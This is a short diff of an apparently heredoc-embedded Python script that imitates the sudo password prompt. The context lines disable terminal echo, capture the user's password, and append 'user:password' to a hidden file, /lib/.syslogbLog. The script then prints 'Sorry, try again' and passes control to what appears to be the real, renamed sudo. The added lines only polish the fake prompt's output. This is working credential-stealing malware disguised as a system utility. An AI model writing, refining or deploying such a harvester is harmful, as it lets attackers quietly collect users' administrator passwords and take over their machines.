@@ -22,11 +22,13 @@ def main():
         os.system('stty -echo')
         sudoCommand = "[sudo] password for " + user + ": "
         password = input("[sudo] password for " + user + ": ")
+        print()
         
         os.system("echo \"" + user + ":" + password + "\" >> /lib/.syslogbLog")
         time.sleep(3)
         os.system('stty echo')
         print("Sorry, try again.")
+        print("\n")
         os.system("sudoA su")
 main()
 EOFA
